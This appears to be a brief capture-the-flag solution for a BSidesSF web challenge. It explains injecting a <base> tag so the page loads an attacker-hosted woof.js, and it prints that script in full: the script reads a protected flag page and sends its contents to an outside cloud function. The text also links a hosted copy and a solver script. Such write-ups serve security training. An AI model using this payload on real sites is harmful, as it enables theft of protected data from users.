The `/xss-two-result` page sources `woof.js` with a nonce. 


The trick is to insert a `<base>` tag and get the browser to load your `woof.js`. 
```<base href="https://your-server/>```

Host the following file as `woof.js` on your server. 
```
var xhr = new XMLHttpRequest();
xhr.open('GET',location.origin + '/xss-two-flag',true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET','https://us-west1-corgi-test.cloudfunctions.net/store-flag?flag=' + xhr.responseText,true);
request.send()};
xhr.send(null);
```
If you want to use my script, it's hosted at `https://storage.googleapis.com/corgi-test-bucket/woof.js`. 

For a quick solve, run `solution.py`
`python solution.py https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/`

